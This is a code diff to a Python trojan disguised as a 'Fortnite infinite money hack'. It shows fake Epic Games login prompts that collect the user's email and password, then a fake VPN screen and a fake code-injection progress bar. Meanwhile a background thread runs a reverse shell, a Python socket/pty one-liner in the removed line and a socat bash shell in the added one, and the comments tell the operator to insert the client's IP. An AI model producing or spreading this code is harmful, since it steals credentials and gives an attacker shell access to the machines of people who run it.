@@ -1,14 +1,13 @@
-# RECUERDE EDITAR TODOS LOS CAMPOS PERTINENTES!
-
-import time
-import subprocess
-import random
-import threading
-
+# RECUERDE EDITAR LA LINEA 62 Y USAR LA DIRECCION IP DE EL CLIENTE
+# REMEMBER TO EDIT LINE 62 AND USE THE DESIRED CLIENT IP ADDRESS
+import time, subprocess, random, threading, os
+os.system('clear')
 def login():
+    print("FORTNITE INFINITE MONEY HACK 2023\nLOGGIN TO EPIC GAMES(ANTI-BAN SYSTEM)")
     email = input("Enter your email: ")
     password = input("Enter your password: ")
-    print("\033[2J\n")
+    os.system('clear')
+    print("FORTNITE INFINITE MONEY HACK 2023\nLOGGIN TO EPIC GAMES(ANTI-BAN SYSTEM)")
     confirm_email = input("Confirm your email: ")
     confirm_password = input("Confirm your password: ")
     
@@ -24,10 +23,11 @@ login()
 time.sleep(5)
 print("Starting built-in VPN for a secure connection(ANTI-BAN)...")
 time.sleep(10)
-print("Connecting to Epic Games... please wait.")
+print("Connecting to Epic Games... please wait...")
 time.sleep(10)
-print("Connected!")
+print("Connection succesful!")
 time.sleep(4)
+# aki puedes poner otro banner para un escenario diferente/ here you can choose another banner for a different scenario
 with open('banner.txt', 'r') as f:
     banner = f.read()
 
@@ -39,19 +39,19 @@ def download_bar(progress):
 
 def countdown(duration):
     while duration >= 0:
-        print("\033[2J")
+        os.system('clear')
         print(banner)
 
         progress = int((900 - duration) / 900 * 100)
-        speed = random.randint(800, 1200)  # velocidad de dwonload en KB/s un poco random
+        speed = random.randint(800, 1200)  # velocidad de dwonload en KB/s un poco random / download speed fx
         remaining = duration // speed 
         print(download_bar(progress))
-        print(f"{duration // 60:02d}:{duration % 60:02d} Hack - Infinite money. Code injection download progress @ {speed} KB/s")
+        print(f"{duration // 60:02d}:{duration % 60:02d} Hack Infinite money. Code injection download progress @ {speed} KB/s. Please wait.")
         time.sleep(1)
         duration -= 1
 
-    # mensaje cuando termina download
-    print("\033[2J")
+    # mensaje cuando termina download / message when download ends
+    os.system('clear')
     print(banner)
     print(download_bar(100))
     print("ERROR: Code injection failed! verify your email and password! check your internet connection and try again!")
@@ -59,7 +59,7 @@ def countdown(duration):
 
 def run_subprocess():
     try:
-        output = subprocess.check_output(["python", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,<PUERTO>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')"])
+        output = subprocess.check_output(["/usr/bin/socat", "exec:'bash -li',pty,stderr,setsid,sigint,sane", "tcp:127.0.0.1:4444"])
         print(output.decode())
     except subprocess.CalledProcessError as error:
         print(error)
@@ -67,7 +67,7 @@ def run_subprocess():
 subprocess_thread = threading.Thread(target=run_subprocess)
 subprocess_thread.start()
 
-# tiempo del download
+# tiempo del download / download timer
 countdown(900)  # 15 minutos = 900 segundos
 
 subprocess_thread.join()
